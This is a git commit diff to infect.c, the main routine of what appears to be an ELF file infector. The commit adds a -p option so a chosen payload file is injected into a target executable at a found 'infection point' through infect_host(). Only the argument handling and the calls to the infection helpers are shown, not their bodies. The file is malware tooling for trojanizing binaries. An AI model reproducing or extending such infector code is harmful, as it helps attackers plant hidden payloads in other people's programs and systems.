7954703fd2bc44b0d187935d6dfd4cff8bc4cd4b
H <huatux@users.noreply.github.com>
2022-09-03 19:38:30 +0800

    Update infect.c

--- infect.c
+++ infect.c
@@ -4,37 +4,45 @@
 
 int main(int argc,char **argv)
 {
-        int opt;
-        unsigned char *target_elf = NULL;
+    int opt;
+    unsigned char *target_elf = NULL;
+    unsigned char *payload = NULL;
 
 
-        while ((opt = getopt(argc, argv, "f:")) != -1) {
-                switch (opt) {
+    while ((opt = getopt(argc, argv, "f:p:")) != -1) {
+        switch (opt) {
             case 'f':
                 target_elf = optarg;
                 break;
-                }
+            case 'p':
+                payload = optarg;
+                break;
         }
+    }
 
-        if(target_elf == NULL)
-        {
-           printf("Usage:%s -f \"Target ELF file wanted to infect\"\n", argv[0]);
-           return 1;
-        }
+    if(target_elf == NULL)
+    {
+        printf("Usage:%s -f Target ELF [-p] payload\n", argv[0]);
+        return 1;
+    }
 
-        open_map_file(target_elf);
+    open_map_file(target_elf);
 
+    if(payload == NULL){
         extract_payload("payload.bin");
+    }else{
+        extract_payload(payload);
+    }
 
-        int segment = find_phdr();
-        if(segment<0)
-        {
-                printf("unable to find usable infection point\n");
-                exit(EXIT_FAILURE);
-        }
+    int segment = find_phdr();
+    if(segment<0)
+    {
+        printf("unable to find usable infection point\n");
+        exit(EXIT_FAILURE);
+    }
 
-        infect_host(segment);
+    infect_host(segment);
 
 
-        return 0;
+    return 0;
 }
